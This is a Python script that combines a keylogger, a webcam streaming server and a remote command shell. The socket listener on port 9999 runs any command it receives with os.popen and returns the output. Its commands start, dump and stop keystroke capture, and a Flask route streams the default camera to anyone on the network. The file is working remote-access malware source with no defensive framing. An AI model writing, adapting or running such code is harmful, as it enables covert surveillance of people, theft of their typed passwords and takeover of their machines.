import socket
import threading
import pynput
from pynput.keyboard import Listener
import os
import time
import cv2
from flask import Flask, Response

# Global variable for storing key logs
key_logs = []

# Flask app for streaming webcam feed
app = Flask(__name__)

# Function to capture webcam frames
def gen_frames():
    cap = cv2.VideoCapture(0)  # Open the default camera
    while True:
        success, frame = cap.read()  # Read a frame
        if not success:
            break
        else:
            # Encode frame as JPEG
            ret, buffer = cv2.imencode('.jpg', frame)
            if not ret:
                continue
            frame = buffer.tobytes()
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n\r\n')
    cap.release()

# Keylogger functionality using pynput
def on_press(key):
    try:
        key_logs.append(str(key.char))  # Regular character keys
    except AttributeError:
        key_logs.append(f"[{key}]")  # Special keys (e.g., space, enter)

# Keylogger commands handling
def keylogger_commands(connection):
    global key_logs
    while True:
        command = connection.recv(1024).decode()  # Receive command from the reverse shell
        if command == "key_start":
            # Start the keylogger
            connection.send("Keylogger started.".encode())
            with Listener(on_press=on_press) as listener:
                listener.join()
        elif command == "key_dump":
            # Dump the keylogs
            if key_logs:
                logs = "".join(key_logs)
                connection.send(logs.encode())
            else:
                connection.send("No logs yet.".encode())
        elif command == "key_stop":
            # Stop the keylogger
            connection.send("Keylogger stopped.".encode())
            break
        time.sleep(1)

# Reverse shell server
def reverse_shell_server(host='0.0.0.0', port=9999):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)  # Listen for incoming connections
    print(f"Listening for incoming connections on {host}:{port}...")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Connection established with {client_address}")

        try:
            while True:
                # Receive a command from the reverse shell
                command = client_socket.recv(1024).decode()
                if not command:
                    break  # No command, break out of the loop
                
                if command.lower() == "exit":
                    client_socket.close()
                    break
                elif command.lower().startswith("key_"):
                    keylogger_commands(client_socket)
                else:
                    # Execute system commands
                    result = os.popen(command).read()
                    client_socket.send(result.encode())
        except Exception as e:
            print(f"Error: {e}")
            client_socket.close()

# Flask route to stream webcam
@app.route('/video_feed')
def video_feed():
    return Response(gen_frames(),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

# Start Flask server in a separate thread to handle webcam streaming
def start_flask():
    app.run(host='0.0.0.0', port=5000, threaded=True)

# Function to run reverse shell server in a separate thread
def start_reverse_shell():
    thread = threading.Thread(target=reverse_shell_server)
    thread.start()

if __name__ == "__main__":
    # Start Flask server to handle webcam stream
    flask_thread = threading.Thread(target=start_flask)
    flask_thread.start()

    # Start reverse shell server to handle reverse shell connections
    reverse_shell_thread = threading.Thread(target=start_reverse_shell)
    reverse_shell_thread.start()
